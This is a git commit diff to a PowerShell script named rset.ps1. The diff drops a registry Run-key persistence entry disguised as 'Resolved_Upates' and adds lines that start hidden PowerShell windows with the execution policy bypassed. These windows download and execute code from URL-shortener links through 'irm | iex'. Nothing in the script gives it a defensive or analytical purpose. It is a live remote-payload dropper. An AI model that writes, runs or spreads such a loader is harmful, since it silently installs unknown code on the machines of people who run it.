02258a1dfc8bc9335c5cec5a435649b8279b4abe
CloudFox9 <72619248+CloudFox9@users.noreply.github.com>
2025-06-11 03:36:29 +0530

    Update rset.ps1

--- rset.ps1
+++ rset.ps1
@@ -1,3 +1,3 @@
-$command = 'Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://shorturl.at/wmI5v | iex`""'
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Resolved_Upates" -Value $command
-irm https://shorturl.at/wmI5v | iex
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://shorturl.at/HbrHR | iex`""
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://shorturl.at/wmI5v | iex`""
+EXIT
